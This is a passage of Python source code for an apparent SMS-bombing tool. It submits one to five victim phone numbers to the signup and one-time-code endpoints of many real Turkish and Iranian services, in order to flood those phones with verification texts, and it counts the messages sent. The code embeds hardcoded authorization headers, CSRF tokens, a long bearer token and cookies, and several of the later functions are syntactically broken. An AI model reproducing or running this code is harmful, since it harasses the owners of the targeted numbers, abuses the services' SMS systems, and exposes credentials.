                    url = "https://api2.e-bebek.com:443/ebebekwebservices/v2/ebebek/users/anonymous/validate?curr=TRY&lang=tr"
                    headers = {"Content-Type": "application/json", "Authorization": f"Bearer {auth}"}
                    json={"email": self.mail, "emailAllow": False, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "smsAllow": True, "uid": numara}
                    r = requests.post(url, headers=headers, json=json)
                    if r.json()["status"] == "SUCCESS":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api2.e-bebek.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api2.e-bebek.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    #sakasu.com.tr
    def Saka(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mobilcrm2.saka.com.tr:443/api/customer/login"
                    json={"gsm": numara}
                    r = requests.post(url, json=json)
                    if (r.json()["status"]) == 1 :
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobilcrm2.saka.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobilcrm2.saka.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #gofody.com
    def Gofody(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://backend.gofody.com:443/api/v1/enduser/register/"
                    json={"country_code": "90", "phone": numara}
                    r = requests.post(url, json=json)
                    if (r.json()["success"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> backend.gofody.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> backend.gofody.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue


    #madamecoco.com
    def Madame(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.madamecoco.com:443/users/registration/"
                    headers = {"Content-Type": "multipart/form-data; boundary=mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.madamecoco.com/", "User-Agent": "Madame%20Coco/1 CFNetwork/1335.0.3 Darwin/21.6.0"}
                    data = f"--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{numara}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u--\r\n"
                    r = requests.post(url, headers=headers, data=data)
                    if (r.status_code) == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> madamecoco.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> madamecoco.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #balikesiruludag.com.tr
    def Buludag(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.get(f"https://bilet.balikesiruludag.com.tr:443/mobil/UyeOlKontrol.php?CepTelefon={numara}")
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bilet.balikesiruludag.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bilet.balikesiruludag.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #evidea.com
    def Evidea(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.evidea.com:443/users/register/"
                    headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
                    data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{numara}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
                    r = requests.post(url, headers=headers, data=data)      
                    if r.status_code == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> evidea.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> evidea.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #koctas.com.tr
    def Koctas(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://occ2.koctas.com.tr:443/koctaswebservices/v2/koctas/registerParo/get-register-parocard-otp"
                    data = {"givePermission": "true", "mobileNumber": numara}
                    r = requests.post(url, data=data)
                    if (r.json()["status"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> occ2.koctas.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> occ2.koctas.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #gratis.com
    def Gratis(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    token = requests.get("https://ivt.mobildev.com:443/auth", headers={"Accept": "*/*", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Authorization": "Basic NDkxNTkwNjU2OTpnMDg1M2YzY3Z0cjJkYXowYTFodXE3bnNveGZ6cTA=", "Connection": "close"}).json()["access_token"]
                    url = "https://ivt.mobildev.com:443/data/0e80tyg8"
                    headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": f"Bearer {token}", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}
                    json={"accountType": 0, "coordinate": {"lat": 0, "lon": 0}, "customId": "", "email": self.mail, "etk": {"call": 2, "email": 2, "emailFrequency": 2, "emailFrequencyType": 1, "msisdn": 1, "msisdnFrequency": 2, "msisdnFrequencyType": 1, "share": 1}, "extended": {"loyalty": 11}, "firstName": "Memati", "kvkk": {"international": 1, "process": 1, "share": 1}, "language": "tr", "lastName": "Bas", "msisdn": numara, "note": "\xc4\xb0zin S\xc3\xbcreci Ba\xc5\x9flatma", "permSource": 3}
                    r = requests.post(url, headers=headers, json=json)
                    if (r.status_code) == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ivt.mobildev.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ivt.mobildev.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
    
    def snap(phone):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": generate_user_agent(os="android"), "content-type": "application/json", "accept": "*/*","origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
        snapD = {"cellphone": phone}
        try:
            post(url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD)
            return True
        except:
            pass

    def shad(phone):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        shadH = {"Host": "shadmessenger12.iranlms.ir", "content-length": "96", "accept": "application/json, text/plain, */*", "user-agent": generate_user_agent(os="android"), "content-type": "text/plain","origin": "https://shadweb.iranlms.ir", "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://shadweb.iranlms.ir/", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
        shadD = {"api_version": "3", "method": "sendCode", "data": {"phone_number": ("+")[1], "send_type": "SMS"}}
        try:
            post(url="https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadD)
            return True
        except:
            pass


    def tap30(phone):
        tap30H = {"Host": "tap33.me", "Connection": "keep-alive", "Content-Length": "63", "User-Agent": generate_user_agent(os="android") , "content-type": "application/json", "Accept": "*/*","Origin": "https://app.tapsi.cab", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://app.tapsi.cab/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
        tap30D = {"credential": {"phoneNumber": "0" + ("+90")[1], "role": "PASSENGER"}}
        try:
            post(url="https://tap33.me/api/v2/user",  headers=tap30H, json=tap30D)
            return True
        except:
            pass


    def emtiaz(phone):
        emH = {"Host": "web.emtiyaz.app", "Connection": "keep-alive", "Content-Length": "28", "Cache-Control": "max-age\u003d0", "Upgrade-Insecure-Requests": "1", "Origin": "https://web.emtiyaz.app", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": generate_user_agent(os="android"), "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://web.emtiyaz.app/login", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "Cookie": "__cfduid\u003dd3744e2448268f90a1ea5a4016884f7331596404726; __auc\u003dd86ede5a173b122fb752f98d012; _ga\u003dGA1.2.719537155.1596404727; __asc\u003d7857da15173c7c2e3123fd4c586; _gid\u003dGA1.2.941061447.1596784306; _gat_gtag_UA_124185794_1\u003d1"}
        emD = "send=1&cellphone=0"+("+90")[1]
        try:
            post(url="https://web.emtiyaz.app/json/login", headers=emH, data=emD)
            return True
        except:
            pass


    def divar(phone):
        divarH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/x-www-form-urlencoded','origin': 'https://divar.ir','referer': 'https://divar.ir/','user-agent': generate_user_agent(os="android") ,'x-standard-divar-error': 'true'}
        divarD = {"phone": ("+90")[1]}
        try:
            post(url="https://api.divar.ir/v5/auth/authenticate",  headers=divarH, json=divarD)
            return True
        except:
            pass


    def rubika(phone):
        ruH = {"Host": "messengerg2c4.iranlms.ir", "content-length": "96", "accept": "application/json, text/plain, */*", "user-agent": generate_user_agent(os="android"), "content-type": "text/plain","origin": "https://web.rubika.ir", "sec-fetch-site": "cross-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://web.rubika.ir/", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
        ruD = {"api_version": "3", "method": "sendCode", "data": {"phone_number": ("+")[1], "send_type": "SMS"}}
        try:
            post(url="https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD)
            return True
        except:
            pass


    def bama(phone):
        bamaH = {"Host": "bama.ir", "content-length": "22", "accept": "application/json, text/javascript, */*; q\u003d0.01", "x-requested-with": "XMLHttpRequest", "user-agent": generate_user_agent(os="android"), "csrf-token-bama-header": "CfDJ8N00ikLDmFVBoTe5ae5U4a2G6aNtBFk_sA0DBuQq8RmtGVSLQEq3CXeJmb0ervkK5xY2355oMxH2UDv5oU05FCu56FVkLdgE6RbDs1ojMo90XlbiGYT9XaIKz7YkZg-8vJSuc7f3PR3VKjvuu1fEIOE", "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8", "origin": "https://bama.ir", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://bama.ir/Signin?ReturnUrl\u003d%2Fprofile", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "CSRF-TOKEN-BAMA-COOKIE\u003dCfDJ8N00ikLDmFVBoTe5ae5U4a1o5aOrFp-FIHLs7P3VvLI7yo6xSdyY3sJ5GByfUKfTPuEgfioiGxRQo4G4JzBin1ky5-fvZ1uKkrb_IyaPXs1d0bloIEVe1VahdjTQNJpXQvFyt0tlZnSAZFs4eF3agKg"}
        bamaD = "cellNumber=0"+("+90")[1]
        try:
            post(url="https://bama.ir/signin-checkforcellnumber", headers=bamaH, data=bamaD)
            return True
        except:
            pass


    def snapfood(phone):
        sfoodU = 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa'
        sfoodH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYxZTA5NjE5ZjVmZTNkNmRlOTMwYTQwY2I5NzdlMTBhYWY2Y2MxYWIzYTNhNjYxM2U2YWFmZGNkMzhhOTY0Mzg1NjZkMzIyMGQ3NDU4MTc2In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNjFlMDk2MTlmNWZlM2Q2ZGU5MzBhNDBjYjk3N2UxMGFhZjZjYzFhYjNhM2E2NjEzZTZhYWZkY2QzOGE5NjQzODU2NmQzMjIwZDc0NTgxNzYiLCJpYXQiOjE2MzkzMTQ4NjMsIm5iZiI6MTYzOTMxNDg2MywiZXhwIjoxNjQxOTkzMzgzLCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.aRR7PRnrh-hfQEhkG2YnN_AJL3AjGsI2LmWwRufsvnD6enxPGJQXyZFn9MoH3OSBPmgXFMoHmCnbXvxoDA5jeRdmUvy4swLbKZf7mfv2Zg4CEQusIGgBHeqMmI31H2PIhCLPtShg0trGgzs-BUCArzMM6TV7s1P6GKMhSyXXVzxj8duJxdiNTVx5IeO8GAo8hpt6pojbp3q07xhECgK-8-3n8qevV9CRBtIwhkhqrcubgrQk6ot64ksiosVhHhvI-xVm1AW8hArI62VcEv-13AH92e9n30auYYKC961wRU6_FUFzauHqSXlhWBgZo6-uO9gwrLA7g0_91G8Eu98V4cKsVWZaRLRP1-tQE9otJduaSvEF4e88FdgW3A045Bd0I2F5Uri2WEemVyMV8CVT8Kdio6iBwGl8dLQS7SJhK7OYwTp_S7AZ9A4wJJbTuw-rU4_ykM2PlR5tNXwTNpcEdiLdglFsv9c0NOyClMIsAU7t7NcYcxdQ5twSDWPUmKK-k0xZMdeACUclkYYFNPqGSccGX0jpioyET0sMFrHQyeOvHxGPLfMeoTaXUA8LMognQ3oCWCsZHrcaQSJJ7H9WUIf4SYUvRwp-RE4JUxpOXvxgPjk0b1VUYF0dHjf1C-uQ3D7aYEAuzSW0JWyEFhurNpBaeQQhf35HH-SchuWCjafAr8rU0BCNkQJd4aresr7moHos1a_KoeQ2Y1HloPzsjOzRSpK97vApN0naRwK8k9RsoN65URZDbEzTc1b2dpTUR-VJw7lU0v5jT_PvZs7GUnpnv23UrYQIfMKISF9suy6ufb26DdIAr2pLOQ9NKqxb4QwDadFa1gPIpb_QU-8hL6N9533YTvTE8xJJjjwE6IQutNsZ1OdBdrj4APjNczDpb3PFaXtI0CbOKHYIUDsdyEIdF1o9RYrKYj-EP61SA0gzks-qYGJR1jnfQRkwkqoolu2lvDK0PxDXnM4Crd4kJRxVtrsD0P8P-jEvW6PYAmxXPtnsu5zxSMnllNNeOOAijcxG6IyPW-smsHV-6BAdk5w3FXAPe0ZcuDXb0gZseq2-GnqxmNDmRWyHc9TuGhAhWdxaP-aNm6MmoSVJ-G6fLsjXY3KLaRnIhmNfABxqcx0f03g6sBIh_1Rw965_WydlsMVU_K5-AIfsXPSxSmVnIPrN4VasUnp3XbJmnO9lm_rrpdNAM3VK20UPLCpxI7Ymxdl9wboAg8cdPlyBxIcClwtui0RC1FGZ-GpvVzWZDq_Mu6UEbU3bfi9Brr5CJ-0aa8McOK8TJBHCqfLHYOOqAruaLHhNR0fjw-bIzHLKtxGhwkkGp7n_28HtbiZVKqr48rBfbhzanCpSPYGDV4PM1_zrJDUJn4sRitw_Z78Lju3ssjuMae8zAEdHUCHGui_tYMABlPVaZhsB4s-KahT4aTOhzd7ejjoLE9WQUSuQBmMTGFZM0xH0Phyz1vSl7_5IpTHcCwTXUx3s8UvRB-Q3QQBa5O82gtZWTd56R7u0YrCJKVEnsf9a9lZz9Of6R4YdPhwByMvHFfbRLgNkuGzv75dZZf24KmbPTZN4sVCZgxD7oO0sTgh2hEYMSmdHnXvCySXZk_1G52yP8S7IwnEXRq_Hu1aje2dz0FRWYFR8nnmFuRyYSfj1rSy1Vut4ktNUsstlAYn8QmsvNqyn402aikpuG6s0ApOGMuLChv_BDd_tbsLu11-qLv3r5Exza9XJMq4aOFegpPJ5vH75entTpxPa16gmJ80lhlvKux0vnZI-mEDZ8zEI5uXi26zv4taUqLNw5nXQZbi8sxh90nYF1fNAQ-ERHQmoUeqAwL9AuZobvR7pRMmmjZMPeeDPPFrNDyCHYFO_Iu5kClQM_7jzmsLkOvCD68DkwhwftkNvTiA-dDqkkNpY8OB0GI4ynhrAqHN4Y378qbks7q4ifUU1NsSI5xdkHC4fseKMJTnnCYdyfhH14_X46zuAvSIL7DX262VTb6dAIN5KoHkjacc77Z4V7HsncWBysaXqK5yUIkL3JB5AiZlp8nV0_hCjNfA3QsfGQVoMYYeoTIutKF9Hr9r1efOXmTU0URZ-C6LYgzcntKlryroLwVg5jP3s2jQyCTIvs4CitUAyJEC3VyeW_VlSA02uMqxB-pjkipGEKe3KO1diCU7afe0xkd5C4K1NG-kLAbRAhCCtLRVJVSP0a_t84F737B9lub6bs5QcCvxARlfogXerUg9MjMU9qCWLzN9x2MukbsijxzmsGFcw-OBecMETDwoyB_0HrxP95QCwxw_X4rcW60HL45xbv9iC-gsn1qd-FKzO-XSYU0VWprr_z12bl9QOnpMc6OYf74IeJ27zl1nWR_gLo-Wg-WeFDyWcpNjmiHZkHYiDa1c3RgFv2t4ezYP0tsQEzLy-Yx0yB7WI5Z2kd_cSuaX73U9PW7rOCGnCD9cfyxZ27VyiHx8YMKKch6lyNmwPGfMhYqgMMo4NLmKy44taXRKPV20DhIsuNdMPcPUofrrrTsKarxurCX8EwRev4Ox-GcP-ocFtjKq_jkGRnqh4QQrJJh3Unpxm3sHcWhIWkNIcyChdjwnHPqKLb49UbVyJKxkt26E-cuO7_oC7PbMe8YjKFrmr2_igqr9i-YioVy1MdI5TL9sZhS8bMwG2rMozBYqWT9czRIKwabP9dUKpEn-d1nLbdrEeSzXOLYtXutiO57lGpxTDgf3ELp1zIEvTW7SEJBQ','content-type': 'application/x-www-form-urlencoded','cookie': 'UUID=39c62f64-3d2d-4954-9033-816098559ae4; location={"id":"","latitude":"-1.000","longitude":"-1.000","mode":"Auto"}; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2BRQfjyp1DGE7w6o2UXNZHyc7XXXwZB6%2B4%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FKNDbZLoR2s9fxetSEbovoXrW2OyagTvcRyyfS%2BiAq3Wo0gtPlB2mt5jezOT0RcCuwOIS0v8tUKw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2Bxvj2aS9mFuxvX6rDEMIsAuRecCyMypTk%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2B8so%2F5rMdojUEEuG%2BVwFrtXzXNtpojE10%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2FUIoTuPIMvAKRiGcEmnsfog8TvprQ8QJI%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2FOaB1OTIgZSuGfv6Ov271AcX0ZKQWg94ey1fyJ%2Fv%2B2H09dia3Z%2BMvi; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX19W4bPJRR7lbNo2fIWRB3Gk2GDkBYASrB7u755JxTnymjQ4j%2BjxgRx0; jwt-refresh_token=undefined; jwt-token_type=Bearer; jwt-expires_in=2678399; 